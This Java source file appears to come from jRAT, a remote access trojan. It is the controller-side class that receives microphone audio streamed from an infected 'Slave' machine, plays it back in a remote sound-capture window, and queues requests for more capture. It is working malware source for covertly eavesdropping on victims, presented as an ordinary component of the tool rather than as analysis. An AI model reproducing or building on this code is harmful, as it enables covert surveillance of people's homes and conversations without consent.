package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.SourceDataLine;

import pro.jrat.Slave;
import pro.jrat.packets.outgoing.Packet84SoundCapture;
import pro.jrat.ui.frames.FrameRemoteSoundCapture;



public class Packet58Microphone extends AbstractIncomingPacket {
	
	private AudioFormat format;
	private DataLine.Info info;
	private SourceDataLine line;
	
	private boolean initialized;

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteSoundCapture frame = FrameRemoteSoundCapture.instances.get(slave);
		if (!initialized) {
			if (frame != null) {
				format = new AudioFormat(frame.getQuality(), 8, 1, true, true);
			} else {
				format = new AudioFormat(16000, 8, 1, true, true);
			}
			info = new DataLine.Info(SourceDataLine.class, format);
			if (!AudioSystem.isLineSupported(info)) {
				throw new Exception("Sound line is not supported");
			}
			line = (SourceDataLine)AudioSystem.getLine(info);
			line.open(format);
			line.start();
			initialized = true;
		}
		
		int size = slave.readInt();
		
		byte[] data = new byte[size];
		
		slave.getDataInputStream().readFully(data);
		
		if (frame != null && frame.isRunning()) {
			line.write(data, 0, data.length);
		}
	}
	
	public void close() {
		if (line != null) {
			line.close();
		}
	}
	
	public static void handle(Slave sl, DataInputStream dis) throws Exception {
		FrameRemoteSoundCapture frame = FrameRemoteSoundCapture.instances.get(sl);
		if (frame != null) {
			frame.packet.read(sl, dis);
			
			if (frame.isRunning()) {
				sl.addToSendQueue(new Packet84SoundCapture(false, null));
			}
		}
	}

}